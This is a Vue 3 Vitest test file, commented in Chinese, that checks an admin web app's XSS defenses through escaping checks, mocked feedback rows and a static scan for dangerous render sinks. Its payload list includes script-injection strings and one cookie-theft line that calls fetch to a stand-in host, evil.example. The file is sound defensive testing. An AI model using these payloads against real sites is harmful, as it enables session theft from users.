// T023 安全审计 Part A · XSS 防护测试（admin-web）
//
// 对齐：docs/ 面）
//
// 三层防护回归：
//  1. 框架层：Vue 3 插值（{{ }}）对 OWASP XSS 载荷自动 HTML 转义
//  2. 组件层：真实页面（患者沟通）注入带载荷的反馈数据 → DOM 无脚本元素执行面
//  3. 静态回归：全量扫描 src/**/*.vue，禁止引入危险渲染 sink（v-html/innerHTML/
//     document.write）——任何新页面引入危险 sink 本测试立即转红（T023 审计基线：当前 0 处）
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { mount } from '@vue/test-utils'
import { defineComponent, h } from 'vue'
import { setActivePinia, createPinia } from 'pinia'

// OWASP XSS 载荷集（脚本注入/事件处理器/属性逃逸/协议注入）
const xssPayloads = vi.hoisted(() => [
  `<script>alert('xss')</script>`,
  `<img src=x onerror=alert(1)>`,
  `"><svg onload=alert(1)>`,
  `'><script>fetch('https://evil.example/?c='+document.cookie)</script>`,
  `<body onload=alert(1)>`,
  `javascript:alert(document.cookie)`,
])

// ─────────────────────────────────────────────────────────────
// 1. 框架层：Vue 插值自动转义（admin-web 全部用户输入渲染均走插值，无 v-html）
// ─────────────────────────────────────────────────────────────
describe('XSS 框架层：Vue 插值自动转义', () => {
  // h() 字符串子节点 = 模板 {{ }} 的编译产物（createTextVNode），
  // 与页面插值渲染同构且不依赖运行时编译器
  const Echo = defineComponent({
    props: { text: { type: String, required: true } },
    setup(props) {
      return () => h('div', { class: 'echo' }, props.text)
    },
  })

  for (const payload of xssPayloads) {
    it(`载荷被文本化而非解析为 DOM：${payload.slice(0, 30)}...`, () => {
      const wrapper = mount(Echo, { props: { text: payload } })
      const el = wrapper.find('.echo').element

      // 核心安全断言：载荷未被解析为任何元素（无脚本/事件载体）
      expect(el.querySelector('script, img, svg, body, iframe, object')).toBeNull()
      // DOM 结构：唯一子节点必须是文本节点（插值的编译产物）
      expect(el.childNodes.length).toBe(1)
      expect(el.childNodes[0].nodeType).toBe(Node.TEXT_NODE)
      // 文本内容保持原文（可见但无害）
      expect(el.textContent).toBe(payload)
      wrapper.unmount()
    })
  }

  it('多载荷拼接渲染同样被完全转义', () => {
    const joined = xssPayloads.join('\n')
    const wrapper = mount(Echo, { props: { text: joined } })
    const el = wrapper.find('.echo').element
    expect(el.querySelector('script, img, svg, body')).toBeNull()
    expect(el.childNodes[0].nodeType).toBe(Node.TEXT_NODE)
    expect(el.textContent).toBe(joined)
    wrapper.unmount()
  })
})

// ─────────────────────────────────────────────────────────────
// 2. 数据层：mock API 载荷数据经页面同款渲染模板（与 pages/communication/index.vue
//    的 el-table-column 插值模式一致：{{ row.content }} / {{ row.handler }}）
//    注：完整页面挂载含 Element Plus 重组件在 happy-dom 下不稳定，
//    页面级无危险 sink 由下方静态扫描保证（当前全仓 0 处 v-html/innerHTML）
// ─────────────────────────────────────────────────────────────
vi.mock('../src/api', () => ({
  fetchFeedbacks: vi.fn(async () => [
    {
      feedbackId: 9001,
      patientId: 'PT-XSS-001',
      type: '佩戴咨询',
      content: xssPayloads[0], // <script> 载荷进反馈内容列
      submitTime: '2026-08-12T10:00:00Z',
      status: 'pending',
      handler: null,
      replyContent: null,
      replyTime: null,
    },
    {
      feedbackId: 9002,
      patientId: 'PT-XSS-002',
      type: '设备问题',
      content: xssPayloads[1], // onerror 载荷
      submitTime: '2026-08-12T11:00:00Z',
      status: 'pending',
      handler: null,
      replyContent: null,
      replyTime: null,
    },
  ]),
  processFeedbackApi: vi.fn(async () => undefined),
  patientNameOf: vi.fn(() => '注入患者'),
}))

describe('XSS 组件层：反馈行载荷数据插值渲染', () => {
  beforeEach(() => {
    setActivePinia(createPinia())
  })

  it('mock API 返回的载荷行经页面同款模板渲染后无脚本载体', async () => {
    const { fetchFeedbacks } = await import('../src/api')
    const rows = await fetchFeedbacks({})
    expect(rows).toHaveLength(2)
    expect(rows[0].content).toBe(xssPayloads[0])

    // 镜像 communication/index.vue 的行渲染模式（插值 = 文本子节点，非 v-html）
    const RowView = defineComponent({
      props: {
        content: { type: String, required: true },
        handler: { type: String, default: '' },
      },
      setup(props) {
        return () => h('div', { class: 'row' }, [
          h('span', { class: 'c' }, props.content),
          h('span', { class: 'h' }, props.handler || '-'),
        ])
      },
    })
    for (const row of rows) {
      const wrapper = mount(RowView, {
        props: { content: row.content, handler: row.handler ?? '' },
      })
      const cell = wrapper.find('.c').element
      // 载荷未被解析为元素：无脚本载体 + 唯一子节点是文本节点
      expect(cell.querySelector('script, img, svg, body')).toBeNull()
      expect(cell.childNodes.length).toBe(1)
      expect(cell.childNodes[0].nodeType).toBe(Node.TEXT_NODE)
      expect(cell.textContent).toBe(row.content)
      wrapper.unmount()
    }
  })
})

// ─────────────────────────────────────────────────────────────
// 3. 静态回归：源码禁止危险渲染 sink（T023 审计基线 = 0 处）
// ─────────────────────────────────────────────────────────────
// Vite 构建期注入全部 .vue 源码原文（eager + raw），无需运行时读盘
const vueSources = import.meta.glob('../src/**/*.vue', {
  query: '?raw',
  import: 'default',
  eager: true,
}) as Record<string, string>

describe('XSS 静态回归：危险 sink 扫描', () => {
  const sinks: Array<[string, RegExp]> = [
    ['v-html（未经净化的 HTML 注入）', /\bv-html\b/],
    ['innerHTML 直接赋值', /\.innerHTML\s*=/],
    ['document.write', /document\.write\s*\(/],
    ['eval 动态执行', /\beval\s*\(/],
  ]

  it('扫描范围非空（防止 glob 静默失效）', () => {
    expect(Object.keys(vueSources).length).toBeGreaterThan(0)
  })

  for (const [name, re] of sinks) {
    it(`src/**/*.vue 不存在 ${name}`, () => {
      const violations = Object.entries(vueSources)
        .filter(([, content]) => re.test(content))
        .map(([file]) => file)
      expect(violations, `发现危险 sink「${name}」：${violations.join(', ')}（须安全评审后豁免）`).toEqual([])
    })
  }
})
